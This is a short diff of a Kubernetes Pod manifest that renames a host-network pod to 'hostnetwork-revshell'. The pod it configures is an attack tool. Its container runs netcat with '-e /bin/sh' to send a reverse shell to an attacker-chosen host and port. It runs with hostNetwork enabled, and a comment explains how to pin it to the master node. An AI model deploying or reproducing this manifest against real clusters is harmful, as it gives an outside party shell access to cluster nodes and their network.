@@ -6,9 +6,9 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostnetwork
+  name: pod-hostnetwork-revshell
   labels:
-    app: hostnetwork
+    app: hostnetwork-revshell
 spec:
   hostNetwork: true
   containers:
@@ -16,7 +16,7 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     imagePullPolicy: IfNotPresent
-    name: hostnetwork
+    name: hostnetwork-revshell
   # Force scheduling of your pod on master mode by uncommenting this line and changing the name
   #nodeName: k8s-master
   restartPolicy: Always
